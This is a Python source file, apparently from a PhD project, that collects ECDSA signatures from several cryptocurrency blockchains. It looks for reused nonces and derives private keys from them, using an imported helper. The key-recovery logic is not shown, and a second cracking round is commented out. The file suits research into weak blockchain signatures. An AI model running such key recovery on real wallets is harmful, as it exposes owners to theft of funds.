import ecdsa
from ecdsa.curves import Curve
from keys_recovery.SignatureDB import SignatureDB, SignatureFolder
from keys_recovery.ecdsa_helper import derive_private_key_from_repeated_nonces


class ECDSABreaker:
    def __init__(
        self,
        signature_folders: list[SignatureFolder],
        curve: Curve,
    ) -> None:
        self.db = SignatureDB(signature_folders, curve=curve)
        self.curve = curve

    def crack(self):
        # ROUND 0: Derive nonces and private keys from repeated nonces
        self.__crack_repeated_nonces()

        # ROUND 1: Derive nonces from known private keys and private keys from known nonces
        self.__crack_from_known_nonces_and_keys()

    def __crack_repeated_nonces(self):
        repeated_nonces_df = self.db.find_repeated_nonces()
        repeated_nonces_df[["nonce", "privkey"]] = repeated_nonces_df.apply(
            lambda row: derive_private_key_from_repeated_nonces(
                row["r"], row["s"], row["digests"], self.curve
            ),
            axis=1,
            result_type="expand",
        )
        repeated_nonces_df["r_chain"] = repeated_nonces_df["chain"]

        self.db.expand_cracked_keys(
            repeated_nonces_df[
                ["chain", "vulnerable_timestamp", "r", "pubkey", "privkey", "r_chain"]
            ]
        )

        self.db.expand_known_nonce(
            repeated_nonces_df[
                ["r", "nonce", "chain", "vulnerable_timestamp"]
            ].set_index(keys="r")
        )

    def __crack_from_known_nonces_and_keys(self):
        crackable_keys, crackable_nonces = self.db.get_crackable_keys_and_nonces()

        """while len(crackable_keys.index) > 0 or len(crackable_nonces.index) > 0:
            crackable_keys["private_key"] = crackable_keys.apply(
                derive_private_key_from_known_nonce, axis=1
            )

            crackable_keys, crackable_nonces = self.db.get_crackable_keys_and_nonces()"""


if __name__ == "__main__":
    signature_folders = [
        SignatureFolder(
            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/signatures/bch",
            check_signatures=True,
        ),
        SignatureFolder(
            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/signatures/btc"
        ),
        SignatureFolder(
            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/signatures/dash"
        ),
        SignatureFolder(
            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/signatures/ltc"
        ),
        SignatureFolder(
            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/signatures/doge"
        ),
    ]

    signature_folders = [
        SignatureFolder(
            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/signatures/doge"
        ),
    ]

    breaker = ECDSABreaker(signature_folders, ecdsa.SECP256k1)
    breaker.crack()
